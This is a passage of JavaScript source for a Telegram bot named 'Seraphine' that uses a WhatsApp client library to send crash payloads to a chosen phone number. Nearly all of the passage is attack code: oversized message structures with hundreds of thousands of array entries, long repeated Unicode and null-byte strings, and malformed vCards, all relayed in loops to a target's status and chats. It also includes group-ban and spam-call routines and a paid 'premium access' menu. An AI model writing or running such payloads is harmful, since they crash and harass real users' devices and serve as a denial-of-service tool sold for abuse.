                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 500000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    const bpklo = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                999999999999999998999,
                                999999999999999899999,
                                999999999999999989999,
                                999999999999999998999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "LexzyMods - punya acaa¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 750000 }, () => ({}))
                    }
                }
            }
        }
    };

    const mmklu = generateWAMessageFromContent(target, bpklo, {});

    await sock.relayMessage(target, mmklu.message, {
        participant: target,
        messageId: mmklu.key.id
    });

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });
}

async function iosswipper(target) {
const a = " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(70000); 
const b = "𑇂𑆵𑆴𑆿".repeat(70000);
   try {
      let c = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/abcseren",
      }
      let d = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex: c
            }
         }
      }, {});
      let e = {
         extendedTextMessage: { 
            text: b,
            matchedText: " fvck sereη. ",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let f = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx: e
            }
         }
      }, {});
      let g = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(17000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(11000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(28000)}`, 
      }
      let h = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage: g
            }
         }
      }, {});
      let i = {
         extendedTextMessage: { 
            text: a, 
            matchedText: " fvck sereη. ",
            description: "𑇂𑆵𑆴𑆿".repeat(29000),
            title: " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(19000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let j = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg: i
            }
         }
      }, {});
      let k = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage: g
            }
         }
      }, {});
      
      for (let i = 0; i < 40; i++) {
      await sock.relayMessage('status@broadcast', d.message, {
         messageId: d.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', f.message, {
         messageId: f.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', d.message, {
         messageId: d.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', f.message, {
         messageId: f.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', k.message, {
         messageId: f.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) { /* kenapa bang? */ }
};

async function invisPermaIOS(target) {
  await sock.relayMessage("status@broadcast", {
  "contactMessage": {
    "displayName": "  — -1 lovers  " + "𑇂𑆵𑆴𑆿".repeat(10000),
    "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;🌺${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🌺${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:  — ellritz -1 lovers  ${"ᩫᩫ".repeat(4000)}\nORG:🌺${"ᩫᩫ".repeat(4000)}\nTITLE:  — ellritz -1 lovers  ${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🌺${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🌺${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:  — ellritz -1 lovers  ${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
  "contextInfo": {
     "participant": "status@broadcast",
        "externalAdReply": {
           "automatedGreetingMessageShown": true,
           "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
           "greetingMessageBody": "\u0000"
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {
        status_setting: "allowlist"
      },
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: {
                jid: target
              }
            }
          ]
        }
      ]
    }]
  })
}
//=========== ASYNC FUNCTION SEND ==========\\
async function crayxkouta(target) {
for (let i = 0; i < 50; i++) {
await invisPermaIOS(target)
await new Promise(resolve => setTimeout(resolve, 2500));
console.log(chalk.red(`[Seraphine - BULLDOZER 🐉 ] ${target}`));
}
}

async function crayxhard(target) {
for (let i = 0; i < 400; i++) {
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await ovaliuminvictus(target, false)
await new Promise(resolve => setTimeout(resolve, 2500));
console.log(chalk.blue(`[Seraphine - OVA ] ${target}`));
}
}

async function blankcrayx(target) {
for (let i = 0; i < 50; i++) {
await iosswipper(target)
await invisPermaIOS(target)
console.log(chalk.red(`[Seraphine - BLANK  ] ${target}`));
}
}

async function crayxios(inviteCode) {
    const senders = Array.from(banSessions.entries());

    if (senders.length === 0) {
        throw new Error("Tidak ada sender BAN yang terhubung.");
    }

    for (let i = 0; i < 25; i++) {
        const [senderNum, banSock] = senders[i % senders.length];

        try {
            console.log(chalk.red(`[Seraphine - FORCE 🦠 ] [${i + 1}/25] ${senderNum}`));
            await groupBan1(banSock, inviteCode);  // ✅ kirim banSock
        } catch (e) {
            console.log(`❌ ${senderNum}: ${e.message}`);
        }
    }
}

async function crayxui(target) {
for (let i = 0; i < 25; i++) {
await starttime(target)
console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
}
}

async function crayxsuper(target) {
for (let i = 0; i < 70; i++) {
await LexcaabosV5(target)
await LexcaabosV7Fix(target)
await noctherHarddelay(target)
await new Promise(resolve => setTimeout(resolve, 2500));
console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
}
}


async function crayxvol(target) {
for (let i = 0; i < 30; i++) {
await starttime(target)
await LexcaabosV5(target)
await LexcaabosV7Fix(target)
await noctherHarddelay(target)
await new Promise(resolve => setTimeout(resolve, 2500));
console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
}
}

async function Crayxbayar(target) {
for (let i = 0; i < 50; i++) {
await LexcaabosV3(target)
await LexcaabosV5(target)
await LexcaabosV7Fix(target)
await noctherHarddelay(target)
await new Promise(resolve => setTimeout(resolve, 2500));
console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
}
}

async function spambol(target) {
for (let i = 0; i < 100; i++) {
await spamcall(target)
await spamcall2(target)
}
}

function sendMenuWithSound(chatId) {
  const bokepjepang = getBotRuntime();

  // Kirim menu
  bot.sendMessage(chatId, buildMainCaption(bokepjepang), {
    parse_mode: "Markdown",
    reply_markup: buildMainKeyboard()
  }).catch(e => console.log(`❌ Menu gagal: ${e.message}`));

  // Kirim lagu otomatis di bawah menu
  setTimeout(() => {
    bot.sendAudio(chatId, fs.createReadStream("SINGGLE ERA/lagu.mp3"), {
      title: "Seraphine",
      performer: "t.me/DilxzzY2",
      caption: `<pre> Seraphine 🚀 </pre>`,
      parse_mode: "HTML"
    }).catch(e => console.log(`❌ Lagu gagal: ${e.message}`));
  }, 100);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
const styles = ["primary", "success", "danger"];
let styleIndex = 0;

function getStyle() {
  const s = styles[styleIndex];
  styleIndex = (styleIndex + 1) % styles.length;
  return s;
}


bot.onText(/\/start/, (msg) => {
  const chatId   = msg.chat.id;
  const senderId = msg.from.id;
  const bokepjepang = getBotRuntime();

  if (shouldIgnoreMessage(msg)) return;

  // --- Cek premium (user ATAU grup VIP) ---
  if (!hasPremiumAccess(senderId, chatId, msg.chat.type)) {
    return bot.sendPhoto(chatId, "https://j.top4top.io/p_39077fbdn0.png", {
      caption: `\`\`\`
anda tidak termasuk ke dalam user premium, silahkan untuk membeli acces kepada owner bot
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "👤 𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/DilxzzY2", style: getStyle() },
            { text: "👁️ 𝘐𝘯𝘧𝘰",  url: "https://t.me/dilcxzz",  style: getStyle() }
          ],
          [
            { text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/DilxzzY2", style: getStyle() }
          ]
        ]
      }
    });
  }

  // --- Menu utama ---
  bot.sendPhoto(chatId, "https://j.top4top.io/p_39077fbdn0.png", {
    caption: buildMainCaption(bokepjepang),
    parse_mode: "Markdown",
    reply_markup: buildMainKeyboard()
  });
});


// ==================== BUILDER MENU UTAMA ====================
function buildMainCaption(bokepjepang) {
  return `\`\`\`
Yōkoso Seraphine no sukuri puto e. Kono sukuri puto o tadashiku tsukai, sapōto shite kudasai. Motto hatten suru tame ni, dōzo riyō shite kudasai.
┌────── [ Seraphine ]
├─── ( 𖥊 ) My Script Info
├々 Author : @DilxzzY2
├々 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 2.2
├々 𝚄𝚙𝚝𝚒𝚖𝚎 : ${bokepjepang}
├々 𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙹𝚊𝚟𝚊𝚂𝚌𝚛𝚒𝚙𝚝
┗━━━━━━━━━━━━━━━━━━━━━々

( ! ) 𝘴𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘣𝘶𝘵𝘵𝘰𝘯 𝘮𝘦𝘯𝘶 𝘣𝘦𝘭𝘰𝘸
\`\`\``;
}

function buildMainKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "[🦠] ༑𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮͠༑⃟꙳", callback_data: "yatim",    style: getStyle() }],
      [{ text: "[🩸] 𝐎͢𝐰͡𝐧͜𝐞͢𝐫⍣᳟𝐌͜𝐞͢𝐧͡𝐮༑⃟꙳", callback_data: "kontollu", style: getStyle() }],
      [{ text: "[🍃] 𝐓‌𝐡‌𝐚‌𝐧‌𝐤‌𝐬 ⍣᳟ 𝐓‌𝐨‌𝐨༑⃟꙳", callback_data: "tq",       style: getStyle() }]
